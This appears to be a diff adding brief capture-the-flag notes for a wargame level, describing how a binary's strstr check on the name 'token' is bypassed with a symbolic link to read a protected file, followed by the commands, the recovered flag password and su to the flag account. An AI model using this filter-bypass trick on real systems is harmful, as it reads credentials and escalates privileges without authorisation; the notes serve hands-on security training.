@@ -1,0 +1,8 @@
+we have a binary that tries to open and write the contents of its argument and we have a file "token"
+the binary (nm or gdb disas main) compares the argument with string "token" with strstr and exits if it passes
+we can open in indirectly with a soft link
+ln -s ~/token /tmp/reference
+./level08 /tmp/reference
+su flag08
+quif5eloekouj29ke0vouxean
+getflag
